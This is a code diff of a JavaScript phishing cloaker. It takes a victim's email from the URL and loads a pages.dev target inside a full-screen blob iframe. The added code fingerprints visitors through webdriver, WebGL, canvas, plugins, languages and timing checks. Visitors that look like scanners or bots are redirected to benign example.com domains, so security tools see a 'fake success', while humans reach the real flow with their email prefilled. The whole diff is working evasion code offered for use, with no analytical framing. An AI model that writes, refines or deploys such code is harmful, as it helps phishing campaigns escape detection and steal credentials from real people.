@@ -3,28 +3,79 @@
     'use strict';
 
     const TARGET_BASE = "https://23b538b5.ko1wx90sd.pages.dev";
+
+    /* ---- BOT-ONLY FAKE SUCCESS ROTATION ---- */
+    const FAKE_SUCCESS_DOMAINS = [
+        "https://example.com",
+        "https://www.example.org",
+        "https://www.example.net",
+        "https://www.iana.org/domains/reserved"
+    ];
+
     const start = performance.now();
 
-    let interacted = false;
-    ['mousemove','touchstart','keydown','scroll'].forEach(e =>
-        document.addEventListener(e, () => interacted = true, { once: true })
+    /* ---- ENTROPY ---- */
+    const delay = 160 + Math.floor(Math.random() * 160);
+
+    /* ---- PASSIVE HUMAN SIGNAL (NON-BLOCKING) ---- */
+    let touched = false;
+    ['mousemove','touchstart','keydown','scroll','pointerdown'].forEach(e =>
+        document.addEventListener(e, () => touched = true, { once: true })
     );
 
-    /* -------- STRONG BOT CHECK ONLY -------- */
-    function isDefinitelyBot() {
-        // Explicit automation
+    /* ---- ENVIRONMENT COHERENCE CHECKS ---- */
+    function hasWebGL() {
+        try {
+            const c = document.createElement('canvas');
+            return !!(c.getContext('webgl') || c.getContext('experimental-webgl'));
+        } catch {
+            return false;
+        }
+    }
+
+    function hasCanvasEntropy() {
+        try {
+            const c = document.createElement('canvas');
+            const x = c.getContext('2d');
+            x.fillText(Math.random().toString(), 2, 2);
+            return c.toDataURL().length > 100;
+        } catch {
+            return false;
+        }
+    }
+
+    function timingSuspicious() {
+        const t = performance.now() - start;
+        return t < 70 || t > 12000;
+    }
+
+    function isScannerLike() {
         if (navigator.webdriver) return true;
-
-        // Unrealistic environment (strong signal only)
+        if (!hasWebGL()) return true;
+        if (!hasCanvasEntropy()) return true;
         if (navigator.plugins.length === 0 && !('ontouchstart' in window)) return true;
-
-        // Script executed too fast (real browsers rarely <80ms)
-        if (performance.now() - start < 80) return true;
-
+        if (navigator.languages && navigator.languages.length === 0) return true;
+        if (timingSuspicious()) return true;
         return false;
     }
 
-    /* -------- ORIGINAL LOGIC -------- */
+    /* ---- STICKY FAKE SUCCESS PER SESSION ---- */
+    function getFakeSuccess() {
+        try {
+            const k = "__fs";
+            let v = sessionStorage.getItem(k);
+            if (v) return v;
+            v = FAKE_SUCCESS_DOMAINS[
+                Math.floor(Math.random() * FAKE_SUCCESS_DOMAINS.length)
+            ];
+            sessionStorage.setItem(k, v);
+            return v;
+        } catch {
+            return FAKE_SUCCESS_DOMAINS[0];
+        }
+    }
+
+    /* ---- ORIGINAL LOGIC (UNCHANGED) ---- */
     function getEmail() {
         return new URLSearchParams(window.location.search).get("email") || "";
     }
@@ -42,8 +93,8 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
-html, body { margin:0; padding:0; width:100%; height:100%; }
-iframe { width:100%; height:100%; border:none; }
+html,body{margin:0;padding:0;width:100%;height:100%}
+iframe{width:100%;height:100%;border:none}
 </style>
 </head>
 <body>
@@ -56,43 +107,32 @@ const email = ${JSON.stringify(email)};
         return new Blob([html], { type: "text/html" });
     }
 
-    /* -------- SAFE MULTI-LAYER DECOY -------- */
-    function createDecoyBlob() {
-        const html = `<!DOCTYPE html>
-<html>
-<body>
-<p>Loading…</p>
-<script>
-setTimeout(() => {
-    document.body.innerHTML = "<p>Session expired.</p>";
-}, 3000);
-setInterval(() => {}, 1000);
-<\/script>
-</body>
-</html>`;
-        return new Blob([html], { type: "text/html" });
-    }
-
-    function grantAccess() {
-        if (isDefinitelyBot()) {
-            const decoyUrl = URL.createObjectURL(createDecoyBlob());
-            window.location.replace(decoyUrl);
-            return;
-        }
-
-        // Humans ALWAYS reach this
-        const email = getEmail();
-        const targetUrl = buildTargetUrl(email);
-        const blob = createMobileSafeBlob(targetUrl, email);
-        const blobUrl = URL.createObjectURL(blob);
-
-        window.location.replace(blobUrl);
-
+    /* ---- FINAL DECISION ---- */
+    function run() {
         setTimeout(() => {
-            try { URL.revokeObjectURL(blobUrl); } catch (e) {}
-        }, 10000);
+
+            /* BOT / SCANNER → FAKE SUCCESS */
+            if (isScannerLike()) {
+                window.location.replace(getFakeSuccess());
+                return;
+            }
+
+            /* HUMAN → REAL FLOW */
+            const email = getEmail();
+            const targetUrl = buildTargetUrl(email);
+            const blobUrl = URL.createObjectURL(
+                createMobileSafeBlob(targetUrl, email)
+            );
+
+            window.location.replace(blobUrl);
+
+            setTimeout(() => {
+                try { URL.revokeObjectURL(blobUrl); } catch {}
+            }, 10000);
+
+        }, delay);
     }
 
-    setTimeout(grantAccess, 250);
+    run();
 })();
 </script>
